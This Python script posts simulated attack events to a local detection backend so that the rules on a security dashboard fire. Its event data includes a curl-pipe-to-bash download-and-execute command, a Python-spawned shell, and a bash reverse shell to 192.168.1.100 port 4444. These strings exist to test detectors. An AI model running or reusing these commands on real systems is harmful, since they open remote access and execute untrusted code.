"""
simulate.py — Inject fake attack events to populate the Attack Timeline.
Run: python3 simulate.py
Requires backend running at localhost:8000.
"""
import time
from datetime import datetime, timezone

import httpx

BASE = "http://localhost:8000"
HOST = "demo-attacker"


def now():
    return datetime.now(timezone.utc).isoformat()


def post(events):
    httpx.post(f"{BASE}/events", json={"events": events}, timeout=5)


def heartbeat():
    httpx.post(f"{BASE}/heartbeat", json={
        "agent_id": HOST,
        "hostname": HOST,
        "os_version": "macOS 14.6",
        "agent_version": "0.1.0",
        "cpu_percent": 42.0,
        "memory_mb": 128.0,
    }, timeout=5)


print("Registering demo host...")
heartbeat()
time.sleep(1)

print("Injecting unusual_listener events...")
post([{"ts": now(), "host": HOST, "event_type": "network_conn",
       "local_ip": "0.0.0.0", "local_port": 4444}])
time.sleep(6)

print("Injecting download_exec events...")
post([{"ts": now(), "host": HOST, "event_type": "process_start",
       "process_name": "bash", "pid": 9001, "ppid": 9000,
       "cmdline": "bash -c curl http://localhost:8000/echo.sh | bash; sleep 4"}])
time.sleep(6)

print("Injecting shell_unusual_parent events...")
post([
    {"ts": now(), "host": HOST, "event_type": "process_start",
     "process_name": "Python", "pid": 9100, "ppid": 1,
     "cmdline": "python3 -c import subprocess; subprocess.Popen(['bash'])"},
    {"ts": now(), "host": HOST, "event_type": "process_start",
     "process_name": "bash", "pid": 9101, "ppid": 9100,
     "cmdline": "bash"},
])
time.sleep(6)

print("Injecting sudo_bruteforce events...")
for i in range(5):
    post([{"ts": now(), "host": HOST, "event_type": "auth_event",
           "username": "attacker"}])
    time.sleep(0.3)
time.sleep(6)

print("Injecting reverse_shell events...")
post([{"ts": now(), "host": HOST, "event_type": "process_start",
       "process_name": "bash", "pid": 9200, "ppid": 1,
       "cmdline": "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1"}])
time.sleep(6)

print("Done! Check the dashboard — all 5 rules should have fired.")
